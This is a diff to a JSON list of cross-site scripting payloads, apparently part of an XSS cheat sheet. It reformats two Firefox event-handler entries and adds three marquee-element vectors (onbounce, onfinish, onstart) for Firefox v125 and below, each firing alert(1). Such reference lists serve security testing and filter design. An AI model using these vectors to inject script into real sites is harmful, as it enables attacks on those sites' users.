@@ -162,17 +162,38 @@
     },
     {
         "description": "onloadstart event for media elements in Firefox v107 and below",
-         "code": "<img src=validimage.png onloadstart=alert(1)>",
-                "browsers": [
-                    "firefox"
-                ]
+        "code": "<img src=validimage.png onloadstart=alert(1)>",
+        "browsers": [
+            "firefox"
+        ]
 
     },
     {
         "description": "onloadend event for media elements in Firefox v107 and below",
         "code": "<input type=image onloadend=alert(1) src=validimage.png>",
-                "browsers": [
-                    "firefox"
-                ]
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "onbounce event for marquee element in Firefox v125 and below",
+        "code": "<marquee width=1 loop=1 onbounce=alert(1)>XSS<\/marquee>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "onfinish event for marquee element in Firefox v125 and below",
+        "code": "<marquee width=1 loop=1 onfinish=alert(1)>XSS<\/marquee>",
+        "browsers": [
+            "firefox"
+        ]
+    },
+    {
+        "description": "onstart event for marquee element in Firefox v125 and below",
+        "code": "<marquee onstart=alert(1)>XSS<\/marquee>",
+        "browsers": [
+            "firefox"
+        ]
     }
 ]
